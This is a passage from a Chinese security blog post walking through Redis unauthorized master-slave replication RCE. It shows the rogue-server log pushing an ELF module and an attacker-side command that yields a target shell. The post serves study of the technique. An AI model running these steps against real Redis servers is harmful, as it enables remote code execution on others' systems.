+<h4 id="341-分离模式"><a class="markdownIt-Anchor" href="#341-分离模式"></a> 3.4.1  分离模式</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rogue Server端: 192.168.229.150</span><br><span class="line">攻击端: 192.168.229.136</span><br></pre></td></tr></table></figure>
+<p>不同于其他利用模块，将分离模式如用上图示所示。</p>
+<p>先运行<code>Rogue Server</code>再运行攻击端<code>Redis-Cli</code>发送攻击指令，即本地将不会运行 <code>Rogue Server</code> ，而是依靠远程主机的 <code>Rogue Server</code>进行响应。</p>
+<p><strong>Rogue Server端</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">python3 ./redis_rogue_server.py  -v</span><br><span class="line">[*] Listening on port: 15000</span><br><span class="line">[+] Accept connection from 192.168.229.136:44762</span><br><span class="line">[&gt;&gt;]b<span class="string">'*1\r\n$4\r\nPING\r\n'</span></span><br><span class="line">[&lt;&lt;]b<span class="string">'+PONG\r\n'</span></span><br><span class="line">[&gt;&gt;]b<span class="string">'*3\r\n$8\r\nREPLCONF\r\n$14\r\nlistening-port\r\n$4\r\n6379\r\n'</span></span><br><span class="line">[&lt;&lt;]b<span class="string">'+OK\r\n'</span></span><br><span class="line">[&gt;&gt;]b<span class="string">'*5\r\n$8\r\nREPLCONF\r\n$4\r\ncapa\r\n$3\r\neof\r\n$4\r\ncapa\r\n$6\r\npsync2\r\n'</span></span><br><span class="line">[&lt;&lt;]b<span class="string">'+OK\r\n'</span></span><br><span class="line">[&gt;&gt;]b<span class="string">'*3\r\n$5\r\nPSYNC\r\n$40\r\na62cf45a906d4a68422cac6f835108dbecb25f3b\r\n$1\r\n1\r\n'</span></span><br><span class="line">[&lt;&lt;]b<span class="string">'+FULLRESYNC b79062efe2211aa8328ab4da3d501fa21b2ac54a 1\r\n$45608\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00&gt;\x00\x01\x00\x00\x00 *\x00\x00\x00\x00\x00\x00@\x00\x00\x00...'</span></span><br><span class="line">[*] Wait <span class="keyword">for</span> redis IO and trans flow close...</span><br></pre></td></tr></table></figure>
+<p><strong>攻击端</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">python3 redis_rogue_server.py -rhost 192.168.229.136 -lhost 192.168.229.150 -s -v</span><br><span class="line">[*] Separate Mode. Plz insure your Rogue Server are listening.</span><br><span class="line">[*] Init connection...</span><br><span class="line">[+] Target accessible!</span><br><span class="line">[*] Exploit Step-1.</span><br><span class="line">[+] RDB dir: /home/<span class="built_in">test</span>/Desktop/redis-5.0.7</span><br><span class="line">[*] Done.</span><br><span class="line">[*] Wait 3 secs <span class="keyword">for</span> REMOTE Rogue Server response.(Use flag -t [N] to change timeout)</span><br><span class="line">[!] Make sure your remote Rogue Server is working now!</span><br><span class="line">[*] Exploit Step-2.</span><br><span class="line">[*] Done.</span><br><span class="line">[+] It may crash target redis cause transfer large data, be careful.</span><br><span class="line">[?] Shell? [i]interactive,[r]reverse:i</span><br><span class="line">[!] DO NOT USING THIS TOOL DO ANYTHING EVIL!</span><br><span class="line">[+] =========================== Shell =============================</span><br><span class="line">$ id</span><br><span class="line">uid=1000(<span class="built_in">test</span>) gid=1000(<span class="built_in">test</span>) groups=1000(<span class="built_in">test</span>),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line">$ <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<h4 id="342-模块源码重编译"><a class="markdownIt-Anchor" href="#342-模块源码重编译"></a> 3.4.2 模块源码重编译</h4>
+<p>修改<code>RedisModules/src/module.c</code>，然后运行编译<code>make</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ vim ./RedisModules/src/module.c</span><br><span class="line">$ <span class="built_in">cd</span> RedisModules</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>
+<h3 id="声明"><a class="markdownIt-Anchor" href="#声明"></a> 声明</h3>
+<p><strong>该项目仅作为安全学习交流之用途，请遵守当地法律法规，任何用于非法用途产生的后果将由使用者本人承担。</strong></p>
+<p><strong>All responsibilities are at your own risk, Please use it only for research purposes.</strong></p>
+<h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2>
+<p><a href="https://github.com/RicterZ/RedisModules-ExecuteCommand" target="_blank" rel="noopener"> https://github.com/RicterZ/RedisModules-ExecuteCommand </a></p>
+<p><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">PPT -  Pavel Toporkov </a></p>
+<p><a href="https://xz.aliyun.com/t/5616" target="_blank" rel="noopener">Redis 4.x RCE - 先知社区</a></p>
+<p>[对一次 redis 未授权写入攻击的分析以及 redis 4.x RCE 学习 -  K0rz3n’s Blog](<a href="https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/07/29/对一次</a> redis 未授权写入攻击的分析以及 redis 4.x RCE 学习/)</p>
+<p><a href="http://www.web-lovers.com/redis-source-replication.html" target="_blank" rel="noopener"> 渐进式解析 Redis 源码 - 复制 replication - wettper</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>T3stzer0</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://www.testzero-wz.com/2019/12/02/Redis未授权主从复制原理解析与实践/">https://www.testzero-wz.com/2019/12/02/Redis未授权主从复制原理解析与实践/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tag/利用分析/"># 利用分析</a>
+                    
+                        <a href="/tag/码代码/"># 码代码</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/03/01/Psexec溯源/">如何通过Windows日志溯源Psexec</a>
+            
+            
+            <a class="next" rel="next" href="/2019/01/22/记一次QQ本地快捷登录漏洞复现/">大黑客们是如何帮你发说说的--记一次QQ本地快捷登录漏洞复现</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <!-- 
+<footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+-->
+    </div>
+</body>
+</html>
